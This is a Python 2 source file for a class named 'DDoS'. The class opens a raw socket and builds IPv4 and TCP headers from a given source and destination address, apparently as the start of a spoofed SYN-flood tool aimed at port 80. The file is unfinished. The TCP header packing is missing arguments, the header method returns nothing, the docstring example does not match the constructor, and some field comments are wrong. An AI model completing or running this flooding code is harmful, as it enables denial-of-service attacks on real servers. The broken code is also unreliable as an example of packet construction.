import socket
import sys
from struct import pack
from lib.core.settings import LOGGER


class DDoS(object):

    def __init__(self, dest_ip, source_ip):
        self.destination = dest_ip
        self.source = source_ip
        self.packet = ""
        self.amount = 30
        self.message = ""

    def check_sum(self):
        """ Produce the 4 byte short of self.message
        >>>> DDoS("test").check_sum()
        9752 """
        s = 0
        for i in range(0, len(self.message), 2):
            w = ord(self.message[i]) + (ord(self.message[i+1]) << 8)
            s += w
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        s = ~s & 0xffff

        return s

    @staticmethod
    def create_packet():
        try:
            return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except socket.error, e:
            error_message = "Unable to create raw IP packet."
            error_message += " IP packet failed with error code: {}".format(e)
            LOGGER.fatal(error_message)

    def create_headers(self):
        ip_header_data = [
            5,                                  # IP IHL
            4,                                  # IPv4
            0,                                  # IP TOS
            0,                                  # Total IP length, will be determined by Kernel
            54321,                              # IP ID number
            0,                                  # IP frag off number
            255,                                # IP mask
            socket.IPPROTO_TCP,                 # IP Protocol
            0,                                  # IP check number
            socket.inet_aton(self.source),      # Source address
            socket.inet_aton(self.destination)  # Destination address
        ]
        tcp_header_data = [
            1234,                # Source port
            80,                  # Destination port
            454,                 # Sequence number
            0,                   # Attack sequence
            5,                   # TCP drop off
            0, 1, 0, 0, 0, 0,    # Don't worry about these.. They're a secret
            socket.htons(5840),  # TCP Windows information
            0, 0                 # More secrets..
        ]

        _ip_ver = (ip_header_data[1] << 4) + ip_header_data[0]
        _tcp_ver = (tcp_header_data[4] << 4) + 0
        _tcp_flags = tcp_header_data[5] + (tcp_header_data[7] << 2)
        complete_ip_header = pack("!BBHHHBBH4s4s", _ip_ver, ip_header_data[2], ip_header_data[3], ip_header_data[4],
                                  ip_header_data[5], ip_header_data[6], ip_header_data[7], ip_header_data[8],
                                  ip_header_data[9], ip_header_data[10])
        complete_tcp_header = pack("!HHLLBBH", tcp_header_data[0], tcp_header_data[1], tcp_header_data[2],
                                   tcp_header_data[3], _tcp_ver, )
        return



